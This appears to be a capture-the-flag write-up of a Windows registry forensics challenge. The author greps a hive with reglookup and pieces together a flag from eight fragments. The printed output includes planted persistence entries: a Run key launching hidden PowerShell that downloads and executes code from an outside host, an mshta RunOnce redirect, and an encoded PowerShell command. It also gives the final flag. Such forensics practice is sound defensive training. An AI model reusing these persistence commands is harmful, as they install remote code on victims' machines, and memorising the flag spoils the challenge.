# Prompt

![](/huntress_2025/Day_14/Beyblade/Challenge_Beyblade.png "Challenge Prompt")

# Solution

- There’s probably a more elegant solution, but I did some manually grepping once I found the “pattern”. I looped through and tried some variations of key phrases/patterns to get the flag. The easiest was first using flag as the search string and then powershell. This does not include failed attempts such as 8_of, 8/8, 6-8, etc. I did use a tool called reglookup for this. 

```
sudo apt install reglookup -y

reglookup beyblade | grep -a flag 			        # 1 of 8
reglookup beyblade | grep -a powershell 		    # 4 of 8
reglookup ../beyblade/beyblade | grep -a 3of8 		# 3 of 8
reglookup ../beyblade/beyblade | grep -a 5_of_8 	# 5 of 8
reglookup ../beyblade/beyblade | grep -a 6/8 		# 6 of 8
reglookup ../beyblade/beyblade | grep -a 7of8		# 7 of 8
reglookup ../beyblade/beyblade | grep -a 8-of		# 8 of 8
```

```
# Output 
/Software/Microsoft/Windows/CurrentVersion/Run/Windows Update Monitor,SZ,powershell -nop -w hidden -c iwr http://cdn.update-catalog[.]com/agent?v=1 -UseBasicParsing|iex ; # flag_value_1_of_8-47cb,
/Software/Microsoft/Windows/CurrentVersion/RunOnce/OneDrive Setup,SZ,cmd /c start /min mshta about:<script>location='http://telemetry.sync-live[.]net/bootstrap?stage=init&note=hash-value-2-8_5cd4'</script>,
/Software/Microsoft/Internet Explorer/TypedURLs/url1,SZ,http://auth.live-sync[.]net/login?session=chunk+3of8:6d7b,
powershell.exe -e JABNAE0A; ## piece:4/8-b34a
/Software/Microsoft/Windows/CurrentVersion/Explorer/TypedPaths/url2,SZ,C:\Users\Public\fragment-5_of_8-0d9c,
/Software/Microsoft/Windows/CurrentVersion/App Paths/wmiprvse.exe/,SZ,C:\Windows\System32\wmiprvse.exe /k netsvcs -tag shard(6/8)-315a,
/Software/Microsoft/Windows/ShellNoRoam/MUICache/C:\Windows\System32\mmc.exe,SZ,Microsoft Management Console - component#7of8-99bb,
/Software/Microsoft/Terminal Server Client/Servers/fileshare.local/UsernameHint,SZ,administrator|segment-8-of-8=58de,
```

- Piece the pieces together and wrap in flag{}: flag{47cb5cd46d7bb34a0d9c315a99bb58de}

# Flag

- flag{47cb5cd46d7bb34a0d9c315a99bb58de}